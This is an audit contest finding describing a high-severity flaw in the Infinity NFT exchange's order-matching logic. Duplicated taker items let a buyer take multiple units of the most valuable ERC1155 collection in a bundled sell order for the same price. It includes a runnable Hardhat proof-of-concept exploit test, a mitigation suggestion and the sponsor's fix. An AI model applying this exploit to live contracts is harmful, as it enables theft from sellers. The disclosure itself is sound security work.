[H-03]canExecTakeOrdermismatchesmakerOrderandtakerItemswhen duplicated items present
Submitted by PwnedNoMore, also found by 0xsanson, hyh, k, throttle, and zzzitron
https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L154-L164
https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116
https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L336-L364
https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L178-L243
Impact
When any user provides asellOrderand they are trying to sell multiple tokens fromn(n > 1) differentERC1155collections in a single order, hakcers can get the tokens of most expensive collections (with n times of the original amount) by paying the same price.
In short, hackers can violate the user-defined orders.
Root Cause
The logic ofcanExecTakeOrderandcanExecMatchOneToManyis not correct.
Let’s takecanExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)as an example, whilecanExecMatchOneToManyshares the same error.
Specifically, it first checks whether the number of selling item inmakerOrdermatches with the ones intakerItems. Note that the number is an aggregated one. Then, it check whether all the items intakerItemsare within the scope defined bymakerOrder.
The problem comes when there are duplicated items intakerItems. The aggregated number would be correct and all taker’s Items are indeed in the order. However, it does not meanstakerItemsexactly matches all items inmakerOrder, which means violation of the order.
For example, if the order requires
[{collection: mock1155Contract1.address,tokens: [{ tokenId: 0, numTokens: 1 }]},{collection: mock1155Contract2.address,tokens: [{ tokenId: 0, numTokens: 1 }]}];
and the taker provides
[{collection: mock1155Contract1.address,tokens: [{ tokenId: 0, numTokens: 1 }]},{collection: mock1155Contract1.address,tokens: [{ tokenId: 0, numTokens: 1 }]}];
The taker can grabs twomock1155Contract1tokens by paying the order which tries to sell amock1155Contract1token and amock1155Contract2token. Whenmock1155Contract1is much more expensive, the victim user will suffer from a huge loss.
As for the approving issue, the users may grant the contract unlimited access, or they may have another order which sellsmock1155Contract1tokens. The attack is easy to perform.
Proof of Concept
First put theMockERC1155.solunder thecontracts/directory:
// SPDX-License-Identifier: MITpragmasolidity0.8.14;import{ERC1155URIStorage}from'@openzeppelin/contracts/token/ERC1155/extensions/ERC1155URIStorage.sol';import{ERC1155}from'@openzeppelin/contracts/token/ERC1155/ERC1155.sol';import{Ownable}from'@openzeppelin/contracts/access/Ownable.sol';contractMockERC1155isERC1155URIStorage,Ownable{uint256numMints;constructor(stringmemoryuri)ERC1155(uri) {}functionmint(addressto,uint256id,uint256amount,bytesmemorydata)externalonlyOwner{super._mint(to,id,amount,data);}}
And then putpoc.jsunder thetest/directory.
const{expect} =require('chai');const{ethers,network} =require('hardhat');const{deployContract,NULL_ADDRESS,nowSeconds} =require('../tasks/utils');const{getCurrentSignedOrderPrice,approveERC20,grantApprovals,signOBOrder} =require('../helpers/orders');asyncfunctionprepare1155OBOrder(user,chainId,signer,order,infinityExchange) {// grant approvalsconstapprovals=awaitgrantApprovals(user,order,signer,infinityExchange.address);if(!approvals) {returnundefined;}// sign orderconstsignedOBOrder=awaitsignOBOrder(chainId,infinityExchange.address,order,signer);constisSigValid=awaitinfinityExchange.verifyOrderSig(signedOBOrder);if(!isSigValid) {console.error('Signature is invalid');returnundefined;}returnsignedOBOrder;}describe('PoC',function() {letsigners,dev,matchExecutor,victim,hacker,token,infinityExchange,mock1155Contract1,mock1155Contract2,obComplicationconstsellOrders= [];letorderNonce=0;constUNIT=toBN(1e18);constINITIAL_SUPPLY=toBN(1_000_000).mul(UNIT);consttotalNFTSupply=100;constnumNFTsToTransfer=50;constnumNFTsLeft=totalNFTSupply-numNFTsToTransfer;functiontoBN(val) {returnethers.BigNumber.from(val.toString());}before(async()=>{// signerssigners=awaitethers.getSigners();dev=signers[0];matchExecutor=signers[1];victim=signers[2];hacker=signers[3];// tokentoken=awaitdeployContract('MockERC20',awaitethers.getContractFactory('MockERC20'),signers[0]);// NFT constracts (ERC1155)mock1155Contract1=awaitdeployContract('MockERC1155',awaitethers.getContractFactory('MockERC1155'),dev, ['uri1']);mock1155Contract2=awaitdeployContract('MockERC1155',awaitethers.getContractFactory('MockERC1155'),dev, ['uri2']);// ExchangeinfinityExchange=awaitdeployContract('InfinityExchange',awaitethers.getContractFactory('InfinityExchange'),dev,[token.address,matchExecutor.address]);// OB complicationobComplication=awaitdeployContract('InfinityOrderBookComplication',awaitethers.getContractFactory('InfinityOrderBookComplication'),dev);// add currencies to registryawaitinfinityExchange.addCurrency(token.address);awaitinfinityExchange.addCurrency(NULL_ADDRESS);// add complications to registryawaitinfinityExchange.addComplication(obComplication.address);// send assetsawaittoken.transfer(victim.address,INITIAL_SUPPLY.div(4).toString());awaittoken.transfer(hacker.address,INITIAL_SUPPLY.div(4).toString());for(leti=0;i<numNFTsToTransfer;i++) {awaitmock1155Contract1.mint(victim.address,i,50,'0x');awaitmock1155Contract2.mint(victim.address,i,50,'0x');}});describe('StealERC1155ByDuplicateItems', ()=>{it('Passed test denotes successful hack',asyncfunction() {// prepare orderconstuser= {address:victim.address};constchainId=network.config.chainId??31337;constnfts= [{collection:mock1155Contract1.address,tokens:[{tokenId:0,numTokens:1}]},{collection:mock1155Contract2.address,tokens:[{tokenId:0,numTokens:1}]}];constexecParams= {complicationAddress:obComplication.address,currencyAddress:token.address};constextraParams= {};constnonce= ++orderNonce;constorderId=ethers.utils.solidityKeccak256(['address','uint256','uint256'], [user.address,nonce,chainId]);letnumItems=0;for(constnftofnfts) {numItems += nft.tokens.length;}constorder= {id:orderId,chainId,isSellOrder:true,signerAddress:user.address,numItems,startPrice:ethers.utils.parseEther('1'),endPrice:ethers.utils.parseEther('1'),startTime:nowSeconds(),endTime:nowSeconds().add(10*60),nonce,nfts,execParams,extraParams};constsellOrder=awaitprepare1155OBOrder(user,chainId,victim,order,infinityExchange);expect(sellOrder).to.not.be.undefined;// form matching nftsconstnfts_= [{collection:mock1155Contract1.address,tokens:[{tokenId:0,numTokens:1}]},{collection:mock1155Contract1.address,tokens:[{tokenId:0,numTokens:1}]}];// approve currencyletsalePrice=getCurrentSignedOrderPrice(sellOrder);awaitapproveERC20(hacker.address,token.address,salePrice,hacker,infinityExchange.address);// perform exchangeawaitinfinityExchange.connect(hacker).takeOrders([sellOrder], [nfts_]);// owners after sale// XXX: note that the user's intention is to send mock1155Contract1 x 1 + mock1155Contract2 x 1// When mock1155Contract1 is much more expensive than mock1155Contract2, user suffers from huge lossexpect(awaitmock1155Contract1.balanceOf(hacker.address,0)).to.equal(2);});});});
And run
$ npx hardhattest--grep PoCPoCStealERC1155ByDuplicateItems✓ Passedtestdenotes successful hack
Note that the passed test denotes a successful hack.
Recommended Mitigation Steps
I would suggest a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.
nneverlander (Infinity) confirmed and resolved:
Fixed inhttps://github.com/infinitydotxyz/exchange-contracts-v2/commit/bbbd362f18a2bb1992620a76e59621132b8a3d8c.
HardlyDifficult (judge) commented:
This is a High risk issue. The PoC demonstrates how a maker specifying a bundle of NFTs could incorrectly have one ERC1155 item in that bundle processed several times by the taker - the bundle is not fully accepted as expected, the item processed multiple times is essentially overfilled, and this may be abused to the taker’s advantage when the NFTs are not valued the same.